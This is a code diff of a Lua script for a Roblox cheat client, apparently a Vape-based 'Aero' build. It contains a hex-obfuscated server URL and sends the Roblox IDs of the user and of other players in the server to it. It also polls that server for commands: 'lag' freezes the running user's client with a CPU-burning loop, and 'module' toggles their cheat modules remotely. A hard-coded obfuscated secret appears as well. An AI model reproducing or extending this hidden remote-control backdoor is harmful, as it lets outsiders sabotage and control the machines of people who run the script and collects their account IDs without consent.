@@ -121,7 +121,8 @@ run(function()
 	end)
 end)
 
-	local _tierCache = {}
+
+local _tierCache = {}
 	local _req = (syn and syn.request) or http_request or request or function() return {Body='{"tier":0}'} end
 
 	local function _bu()
@@ -130,192 +131,181 @@ end)
 	    for _,v in _s do _r = _r .. string.char(tonumber(v,16)) end
 	    return _r
 	end
+local function _ft(uid)
+    local ok, res = pcall(function()
+        return _req({Url=_bu(), Method='POST', Headers={['Content-Type']='application/json'}, Body=httpService:JSONEncode({action='check',roblox_id=tostring(uid),robloxUserId=tostring(uid)})})
+    end)
+    if not ok or not res then return 0 end
+    local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
+    if not dok or not data then return 0 end
+    return tonumber(data.tier) or 0
+end
 
-	local function _ft(uid)
-		local ok, res = pcall(function()
-			return _req({Url=_bu(), Method='POST', Headers={['Content-Type']='application/json'}, Body=httpService:JSONEncode({action='check',roblox_id=tostring(uid)})})
-		end)
-		if not ok or not res then return 0 end
-		local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
-		if not dok or not data then return 0 end
-		return tonumber(data.tier) or 0
-	end
+getgenv()._aeroTierReady = false
+local _fetchQueue = {}
+local _queueRunning = false
 
-	getgenv()._aeroTierReady = false
-	local _fetchQueue = {}
-	local _queueRunning = false
+local function _queueFetch(uid)
+    if _tierCache[uid] ~= nil and _tierCache[uid] ~= false then
+        return
+    end
 
-	local function _queueFetch(uid)
-		if _tierCache[uid] ~= nil and _tierCache[uid] ~= false then return end
-		_tierCache[uid] = nil 
-		table.insert(_fetchQueue, uid)
+    _tierCache[uid] = nil 
 
-		if _queueRunning then return end
-		_queueRunning = true
-		task.spawn(function()
-			while #_fetchQueue > 0 do
-				local id = table.remove(_fetchQueue, 1)
-				local tier = _ft(id)
-				_tierCache[id] = tier
-				task.wait(0.25) 
-			end
-			_queueRunning = false
-		end)
-	end
+    table.insert(_fetchQueue, uid)
 
-	task.spawn(function()
-		_tierCache[lplr.UserId] = _ft(lplr.UserId)
-		getgenv()._aeroTierReady = true
-		
-		task.wait(1)
-		for _, p in playersService:GetPlayers() do
-			if p.UserId ~= lplr.UserId then
-				_queueFetch(p.UserId)
-			end
-		end
-	end)
+    if _queueRunning then return end
 
-	playersService.PlayerAdded:Connect(_queueFetch)
+    _queueRunning = true
+    task.spawn(function()
+        while #_fetchQueue > 0 do
+            local id = table.remove(_fetchQueue, 1)
+            local tier = _ft(id)
 
-	local _commands = {}
-	local lagConnections = {}  
+            _tierCache[id] = tier
+            task.wait(0.2)
+        end
+        _queueRunning = false
+    end)
+end
 
-	local function _registerCommand(name, fn)
-		_commands[name] = fn
-	end
+task.spawn(function()
+    _tierCache[lplr.UserId] = _ft(lplr.UserId)
+    getgenv()._aeroTierReady = true
+    task.wait(1)
+    for _, p in playersService:GetPlayers() do
+        if p.UserId ~= lplr.UserId then
+            _queueFetch(p.UserId)
+        end
+    end
+end)
 
-	local _SERCET = ''
-	local _stok = {'58','37','70','4b','39','6d','51','32','76','52','38','74','59','35','77','5a','33','78','42','36','6e','48','34','6a','4c','39','70','51','32','76','54','38','77','45','35','72','59','39','75','49','33','6f','50','36','61','53','31','64','46','34','67','48','37','6a','4b','39','6d','51','32','76'}
-	local _stmp = ''
-	for _,v in _stok do _stmp = _stmp .. string.char(tonumber(v,16)) end
-	_SERCET = _stmp
+playersService.PlayerAdded:Connect(function(p)
+    _queueFetch(p.UserId)
+end)
 
-	task.spawn(function()
-		local nextPoll = 0
-		while task.wait(0.1) do
-			if tick() < nextPoll then 
-				task.wait(0.05) 
-				continue 
-			end
+local _commands = {}
+local lagConnections = {}  
+local function _registerCommand(name, fn)
+    _commands[name] = fn
+end
 
-			local res = _req({
-				Url = _bu(),
-				Method = 'POST',
-				Headers = {['Content-Type'] = 'application/json'},
-				Body = httpService:JSONEncode({action = 'getMessage', robloxUserId = tostring(lplr.UserId)})
-			})
+local _SERCET = ''
+local _stok = {'58','37','70','4b','39','6d','51','32','76','52','38','74','59','35','77','5a','33','78','42','36','6e','48','34','6a','4c','39','70','51','32','76','54','38','77','45','35','72','59','39','75','49','33','6f','50','36','61','53','31','64','46','34','67','48','37','6a','4b','39','6d','51','32','76'}
+local _stmp = ''
+for _,v in _stok do _stmp = _stmp .. string.char(tonumber(v,16)) end
+_SERCET = _stmp
 
-			if not res or not res.Body then 
-				nextPoll = tick() + 3 
-				continue 
-			end
+task.spawn(function()
+    local nextPoll = 0
+    while true do
+        if tick() < nextPoll then task.wait(0.05) continue end
+        local res = _req({
+            Url = _bu(),
+            Method = 'POST',
+            Headers = {['Content-Type'] = 'application/json'},
+            Body = httpService:JSONEncode({action = 'getMessage', robloxUserId = tostring(lplr.UserId)})
+        })
+        if not res or not res.Body then nextPoll = tick() + 3 continue end
+        local ok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
+        if not ok or not data then nextPoll = tick() + 3 continue end
+        if res.StatusCode == 429 then nextPoll = tick() + ((data.retryAfter or 3000) / 1000) continue end
+        if data.success and data.message then
+            local cmd = tostring(data.message)
+            if _commands[cmd] then
+                _commands[cmd](tostring(data.from), data.args or '')
+            end
+            pcall(function()
+                _req({
+                    Url = _bu(),
+                    Method = 'POST',
+                    Headers = {['Content-Type'] = 'application/json'},
+                    Body = httpService:JSONEncode({action = 'removeMessage', robloxUserId = tostring(lplr.UserId)})
+                })
+            end)
+            nextPoll = tick() + 1.5
+        else
+            nextPoll = tick() + 3
+        end
+    end
+end)
 
-			local ok, data = pcall(httpService.JSONDecode, httpService, res.Body)
-			if not ok or not data then 
-				nextPoll = tick() + 3 
-				continue 
-			end
+local function getAccountTier(player)
+    if _tierCache[player.UserId] == nil then
+        _tierCache[player.UserId] = false
+        task.spawn(function() _tierCache[player.UserId] = _ft(player.UserId) end)
+        return 0
+    end
+    local t = _tierCache[player.UserId]
+    if type(t) ~= "number" then
+        return 0
+    end
+    return t
+end
 
-			if res.StatusCode == 429 then 
-				nextPoll = tick() + ((data.retryAfter or 3000) / 1000) 
-				continue 
-			end
+getgenv().getAeroTier = function(player)
+    return getAccountTier(player)
+end  
 
-			if data.success and data.message then
-				local cmd = tostring(data.message)
-				if _commands[cmd] then
-					_commands[cmd](tostring(data.from), data.args or '')
-				end
+local function startLag(userId)
+    local key = tostring(userId)
+    if lagConnections[key] then return end  
 
-				pcall(function()
-					_req({
-						Url = _bu(),
-						Method = 'POST',
-						Headers = {['Content-Type'] = 'application/json'},
-						Body = httpService:JSONEncode({action = 'removeMessage', robloxUserId = tostring(lplr.UserId)})
-					})
-				end)
-				nextPoll = tick() + 0.7
-			else
-				nextPoll = tick() + 2.45
-			end
-		end
-	end)
+    local state = {active = true}
+    local connection
+    connection = game:GetService("RunService").Heartbeat:Connect(function()
+        if not state.active then
+            connection:Disconnect()
+            lagConnections[key] = nil
+            return
+        end
+        for i = 1, 250000 do
+            local a = math.sin(i) * math.cos(i) + math.sqrt(i) + math.random()
+            local b = string.rep("x", 100)
+        end
+    end)
 
-	local function getAccountTier(player)
-		if not ENABLE_BACKEND_TIERS then return 0 end
-		if _tierCache[player.UserId] == nil then
-			_tierCache[player.UserId] = false
-			task.spawn(function() 
-				_tierCache[player.UserId] = _ft(player.UserId) 
-			end)
-			return 0
-		end
-		local t = _tierCache[player.UserId]
-		return type(t) == "number" and t or 0
-	end
+    lagConnections[key] = {connection = connection, state = state}
+end
 
-	getgenv().getAeroTier = getAccountTier
+local function stopLag(userId)
+    local key = tostring(userId)
+    local data = lagConnections[key]
+    data.state.active = false
+    data.connection:Disconnect()
+    lagConnections[key] = nil
+end
 
-	local function startLag(userId)
-		local key = tostring(userId)
-		if lagConnections[key] then return end  
+-- tier 2
+_registerCommand('lag', function(from, args)
+    if getAccountTier(lplr) >= 1 then return end
+    if not from then return end
+    startLag(from) 
+end)
 
-		local state = {active = true}
-		local connection
-		connection = game:GetService("RunService").Heartbeat:Connect(function()
-			if not state.active then
-				connection:Disconnect()
-				lagConnections[key] = nil
-				return
-			end
-			for i = 1, 250000 do
-				local a = math.sin(i) * math.cos(i) + math.sqrt(i) + math.random()
-				local b = string.rep("x", 100)
-			end
-		end)
+_registerCommand('lagstop', function(from, args)
+    if not from then return end
+    stopLag(from)
+end)
 
-		lagConnections[key] = {connection = connection, state = state}
-	end
-
-	local function stopLag(userId)
-		local key = tostring(userId)
-		local data = lagConnections[key]
-		data.state.active = false
-		data.connection:Disconnect()
-		lagConnections[key] = nil
-	end
-
-	_registerCommand('lag', function(from, args)
-		if getAccountTier(lplr) >= 1 then return end
-		if not from then return end
-		startLag(from) 
-	end)
-
-	_registerCommand('lagstop', function(from, args)
-		if not from then return end
-		stopLag(from)
-	end)
-
-
-	_registerCommand('module', function(from, args)
-		if not args or args == '' then return end
-		local parts = args:split(' ')
-		local moduleName = parts[1]
-		local action = (parts[2] and parts[2]:lower()) or 'toggle'
-		for _, mod in pairs(vape.Modules or {}) do
-			if mod and mod.Name == moduleName then
-				if action == 'enable' then
-					if not mod.Enabled then mod:Toggle() end
-				elseif action == 'disable' then
-					if mod.Enabled then mod:Toggle() end
-				elseif action == 'toggle' then
-					mod:Toggle()
-				end
-			end
-		end
-	end)
-
+-- tier 3
+_registerCommand('module', function(from, args)
+    if not args or args == '' then return end
+    local parts = args:split(' ')
+    local moduleName = parts[1]
+    local action = (parts[2] and parts[2]:lower()) or 'toggle'
+    for _, mod in pairs(vape.Modules or {}) do
+        if mod and mod.Name == moduleName then
+            if action == 'enable' then
+                if not mod.Enabled then mod:Toggle() end
+            elseif action == 'disable' then
+                if mod.Enabled then mod:Toggle() end
+            elseif action == 'toggle' then
+                mod:Toggle()
+            end
+        end
+    end
+end)
 
 for _, v in vape.Modules do
 	if v.Category == 'Combat' or v.Category == 'Render' then
